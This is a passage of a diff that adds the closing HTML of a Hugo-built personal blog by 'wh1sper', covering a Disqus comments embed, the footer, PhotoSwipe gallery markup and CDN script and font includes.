+        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2019 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        
+            welcome to wh1sper's blog <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
